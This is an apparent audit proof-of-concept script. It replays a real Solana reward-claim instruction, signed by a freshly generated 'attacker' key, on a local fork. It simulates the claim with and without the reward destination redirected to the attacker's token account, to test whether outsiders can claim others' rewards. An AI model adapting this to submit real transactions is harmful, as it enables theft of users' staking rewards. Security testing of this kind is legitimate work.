#!/usr/bin/env node
// Fresh outsider signer against a recent RIV ClaimRewards account shape on localhost fork.
const fs=require('fs');
const m='/Users/stacc/Documents/Codex/2026-10-15/goonfi-daybreak-audit/work/audit-tools/node_modules/';
const {Connection,PublicKey,Keypair,TransactionInstruction,TransactionMessage,VersionedTransaction,SystemProgram}=require(m+'@solana/web3.js');
const {getAssociatedTokenAddressSync,createAssociatedTokenAccountIdempotentInstruction,TOKEN_PROGRAM_ID}=require(m+'@solana/spl-token');
const bs58mod=require(m+'bs58'),bs58=bs58mod.default||bs58mod;
const program='RivStK4soPEmsiutQoP8AyJKZE8sdVN52BuAL5u2TmL';
const signature='4j4uoPyYAQFvRn5H9ejyzVmwNQrc1rx92d1AWWDA659Um4puHBbU4NUtpi2nHkGG2jwnXrT3X2GCkgiwenXzVCgp';
const mint=new PublicKey('2bpT3ksMdwdZ6DuHyq3FDUr7HDwvZ5DRZoT1fUPALJaH');
const env=Object.fromEntries(fs.readFileSync('/tmp/composer-helius-only.env','utf8').split('\n').filter(Boolean).map(x=>x.split(/=(.*)/s).slice(0,2)));
const mainnet=new Connection(env.HEAVY_RPC_URL||env.RPC_URL,'confirmed');
const fork='http://127.0.0.1:9397';let id=0;
async function rpc(method,params){const r=await fetch(fork,{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify({jsonrpc:'2.0',id:++id,method,params})});const j=await r.json();if(j.error)throw Error(method+': '+JSON.stringify(j.error));return j.result}
async function main(){
 const tx=await mainnet.getParsedTransaction(signature,{commitment:'confirmed',maxSupportedTransactionVersion:1});
 const original=tx.transaction.message.instructions.find(x=>x.programId.toBase58()===program);
 const flags=Object.fromEntries(tx.transaction.message.accountKeys.map(x=>[x.pubkey.toBase58(),x]));
 const attacker=Keypair.generate(),ata=getAssociatedTokenAddressSync(mint,attacker.publicKey);
 await rpc('surfnet_setAccount',[attacker.publicKey.toBase58(),{data:'',executable:false,
  lamports:1_000_000_000,owner:SystemProgram.programId.toBase58(),rentEpoch:0}]);
 for(const a of original.accounts)await rpc('getAccountInfo',[a.toBase58(),{encoding:'base64',commitment:'processed'}]);
 const rows=[];
 for(const redirect of [false,true]){
  const keys=original.accounts.map((a,i)=>({pubkey:i===0?attacker.publicKey:i===4&&redirect?ata:a,
   isSigner:i===0,isWritable:!!flags[a.toBase58()]?.writable}));
  const ix=new TransactionInstruction({programId:new PublicKey(program),keys,data:Buffer.from(bs58.decode(original.data))});
  const ixs=redirect?[createAssociatedTokenAccountIdempotentInstruction(attacker.publicKey,ata,attacker.publicKey,mint),ix]:[ix];
  const bh=(await rpc('getLatestBlockhash',[{commitment:'processed'}])).value.blockhash;
  const msg=new TransactionMessage({payerKey:attacker.publicKey,recentBlockhash:bh,instructions:ixs}).compileToV0Message();
  const signed=new VersionedTransaction(msg);signed.sign([attacker]);const wire=Buffer.from(signed.serialize());
  const sim=await rpc('simulateTransaction',[wire.toString('base64'),{encoding:'base64',sigVerify:true,
   replaceRecentBlockhash:false,commitment:'processed',accounts:{encoding:'base64',addresses:[original.accounts[4].toBase58(),ata.toBase58(),original.accounts[5].toBase58()]}}]);
  rows.push({redirect,err:sim.value.err,bytes:wire.length,keys:msg.staticAccountKeys.length,units:sim.value.unitsConsumed,logs:sim.value.logs});
  console.log(JSON.stringify({redirect,err:sim.value.err,bytes:wire.length,keys:msg.staticAccountKeys.length,tail:sim.value.logs?.slice(-8)}));
 }
 fs.writeFileSync(__dirname+'/riv-reward-outsider-signed-screen.json',JSON.stringify({generatedAt:new Date().toISOString(),
  program,sourceSignature:signature,sourceSlot:tx.slot,attacker:attacker.publicKey.toBase58(),attackerAta:ata.toBase58(),
  sigVerify:true,mainnetSubmitted:false,forkSubmitted:false,rows},null,2)+'\n');
}
main().catch(e=>{console.error(e.stack||e);process.exitCode=1});
